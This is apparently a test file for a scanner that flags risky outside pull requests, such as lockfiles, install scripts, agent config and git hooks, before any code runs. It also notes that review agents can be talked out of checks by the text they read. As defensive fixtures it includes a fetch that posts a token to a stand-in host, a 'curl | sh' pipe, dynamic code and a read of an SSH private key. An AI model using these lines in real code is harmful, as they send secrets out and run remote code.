// A PULL REQUEST FROM A STRANGER IS READ BEFORE ANYTHING OF IT RUNS.
//
// w-bde446f1aa, 2026-10-07: outside pull requests started arriving on the
// public repository (three in one day, beside five Dependabot bumps), and the
// person who owns it wanted them reviewed for anything malicious before they
// are run, tested or merged. A review agent can be talked out of a check by
// the very text it is reading, so the checks that decide whether code may run
// on this Mac at all are plain code over the diff, done by the pull request
// loop (.claude/skills/review-pull-requests) before any agent sees it, and
// handed to the agent as facts.
//
// Measured against the real queue that day: the dependency bumps (#16 to #20)
// all touch package.json and package-lock.json, so all five must be held back
// from running here; #22 changes one source file and nothing else, so it must
// pass with nothing that blocks a run.

import { describe, it, expect } from 'vitest';
import { scanPullRequest, mayRunHere } from '../.claude/skills/review-pull-requests/scan.mjs';

// A unified diff the way `gh pr diff` prints it.
const diffOf = (file, added = [], removed = []) => [
  `diff --git a/${file} b/${file}`,
  'index 1111111..2222222 100644',
  `--- a/${file}`,
  `+++ b/${file}`,
  `@@ -1,${removed.length + 1} +1,${added.length + 1} @@`,
  ' unchanged line',
  ...removed.map((l) => `-${l}`),
  ...added.map((l) => `+${l}`),
].join('\n');

const flagsOf = (files, diff = '') => scanPullRequest({ files: files.map((path) => ({ path, additions: 1, deletions: 0 })), diff })
  .map((f) => f.flag);

describe('what holds a pull request back from running on this Mac', () => {
  it('passes an ordinary source change with nothing flagged', () => {
    const diff = diffOf('main/codex-approvals.mjs', ['  if (!isInside(root, target)) return null;']);
    const flags = scanPullRequest({ files: [{ path: 'main/codex-approvals.mjs', additions: 8, deletions: 0 }], diff });
    expect(flags).toEqual([]);
    expect(mayRunHere(flags)).toBe(true);
  });

  it('holds back a dependency bump, because new packages bring code that is not in the diff', () => {
    const flags = scanPullRequest({
      files: [{ path: 'package.json', additions: 1, deletions: 1 }, { path: 'package-lock.json', additions: 280, deletions: 61 }],
      diff: diffOf('package.json', ['    "react": "^19.2.0",'], ['    "react": "^18.3.1",']),
    });
    expect(flags.map((f) => f.flag)).toContain('dependencies');
    expect(mayRunHere(flags)).toBe(false);
  });

  it('holds back a lockfile from any ecosystem, alone', () => {
    for (const lock of ['yarn.lock', 'pnpm-lock.yaml', 'bun.lockb', 'Cargo.lock', 'poetry.lock', 'go.sum', 'renderer/package-lock.json']) {
      expect(flagsOf([lock])).toContain('dependencies');
    }
  });

  it('holds back an install script, which runs the moment anyone installs', () => {
    const flags = scanPullRequest({
      files: [{ path: 'package.json', additions: 1, deletions: 0 }],
      diff: diffOf('package.json', ['    "postinstall": "node scripts/setup.mjs",']),
    });
    expect(flags.map((f) => f.flag)).toContain('install-script');
    expect(mayRunHere(flags)).toBe(false);
  });

  it('holds back anything that changes what a coding agent opening the folder would load', () => {
    for (const file of ['CLAUDE.md', 'AGENTS.md', '.claude/settings.json', '.mcp.json', 'renderer/CLAUDE.md', '.cursor/rules/x.mdc', '.vscode/tasks.json']) {
      expect(flagsOf([file])).toContain('agent-config');
    }
  });

  it('holds back git hooks, which run on the next commit or checkout', () => {
    for (const file of ['scripts/hooks/pre-commit', '.husky/pre-push', '.githooks/post-checkout']) {
      expect(flagsOf([file])).toContain('git-hooks');
    }
  });

  it('holds back a binary or a minified file, which cannot be read', () => {
    expect(flagsOf(['build/icon.icns'], 'diff --git a/build/icon.icns b/build/icon.icns\nBinary files /dev/null and b/build/icon.icns differ')).toContain('unreadable');
    expect(flagsOf(['vendor/lib.min.js'])).toContain('unreadable');
    expect(flagsOf(['src/a.js'], diffOf('src/a.js', ['x'.repeat(1200)]))).toContain('unreadable');
  });

  it('flags a workflow change for the GitHub run, without holding back a run here', () => {
    const flags = scanPullRequest({ files: [{ path: '.github/workflows/tests.yml', additions: 2, deletions: 0 }], diff: '' });
    expect(flags.map((f) => f.flag)).toContain('ci');
    expect(mayRunHere(flags)).toBe(true);
    expect(flags.find((f) => f.flag === 'ci').holdsCi).toBe(true);
  });
});

describe('lines worth reading twice, which point the reviewer and decide nothing', () => {
  it('points at a new network call, a spawned process and code built from a string', () => {
    const diff = diffOf('main/x.mjs', [
      "await fetch('https://collector.example/x', { method: 'POST', body: token });",
      "execSync('curl -s https://example.sh | sh');", // public-check: allow (the fake the scan must flag)
      'const f = new Function(src);',
    ]);
    const flags = scanPullRequest({ files: [{ path: 'main/x.mjs', additions: 3, deletions: 0 }], diff });
    const names = flags.map((f) => f.flag);
    expect(names).toEqual(expect.arrayContaining(['network', 'runs-commands', 'dynamic-code']));
    expect(mayRunHere(flags)).toBe(true);
    expect(flags.find((f) => f.flag === 'network').lines[0]).toMatch(/collector\.example/);
  });

  it('points at a long encoded blob and at reaching for keys', () => {
    const diff = diffOf('main/x.mjs', [
      `const payload = '${'QUJD'.repeat(80)}';`,
      "const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_ed25519'));",
    ]);
    const names = scanPullRequest({ files: [{ path: 'main/x.mjs', additions: 2, deletions: 0 }], diff }).map((f) => f.flag);
    expect(names).toEqual(expect.arrayContaining(['encoded', 'secrets']));
  });

  // THE CASES THAT MUST NOT MATCH. A removed line is the PR taking something
  // away, and a word that merely contains "fetch" is not a fetch.
  it('ignores a removed line and a word that only contains the pattern', () => {
    const diff = diffOf('main/x.mjs', ['const data = prefetch(rows);', '// we never exec anything here'], ["await fetch('https://old.example')"]);
    expect(scanPullRequest({ files: [{ path: 'main/x.mjs', additions: 2, deletions: 1 }], diff })).toEqual([]);
  });

  it('names a large pull request as large, and a small one as nothing', () => {
    const big = scanPullRequest({ files: Array.from({ length: 85 }, (_, i) => ({ path: `src/f${i}.js`, additions: 20, deletions: 3 })), diff: '' });
    expect(big.map((f) => f.flag)).toContain('large');
    expect(mayRunHere(big)).toBe(true);
    const small = scanPullRequest({ files: [{ path: 'src/a.js', additions: 20, deletions: 3 }], diff: '' });
    expect(small).toEqual([]);
  });
});
